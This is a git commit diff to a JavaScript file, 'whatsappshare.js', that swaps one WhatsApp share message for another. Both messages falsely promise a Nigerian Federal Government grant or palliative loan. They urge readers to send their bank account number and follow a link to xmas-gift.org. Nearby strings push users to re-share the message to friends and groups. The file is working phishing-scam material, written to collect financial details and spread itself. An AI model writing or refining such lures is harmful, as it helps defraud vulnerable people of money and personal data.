cbf4b4225fc53244e68c86141e9ea6e9049deec3
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-04-18 11:24:15 -0700

    Update whatsappshare.js

--- whatsappshare.js
+++ whatsappshare.js
@@ -1,5 +1,5 @@
 
-        var text1 = "*Federal Government begins disbursement of ₦200,000,000,000 Billion palliative loans.*%0A%0A*The government, through the Bank of Industry, had said it would be disbursing three categories of funding totalling N200bn to support manufacturers and businesses across the country.*%0A%0A*How to Withdraw, Check or Apply* %0A%0A*Send Your Acoount Number Now*%0A%0A_Check if you are among the first category to receive their fund%0A%0A*CHECK AND WITHDRAW HERE* 👇%0Ahttps://xmas-gift.org/fg25kcash",
+        var text1 = "*Federal Government ₦50,000 Grant*%0A%0A*Presidential Conditional Grant is ongoing*%0A%0A*All Nigerians are entitled to benefit from this grant* %0A%0A*Send Your Acoount Number Now*%0A%0A*CHECK AND WITHDRAW CASH HERE* 👇%0Ahttps://xmas-gift.org/fg25kcash",
             text2 = " an amount of ",
             text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
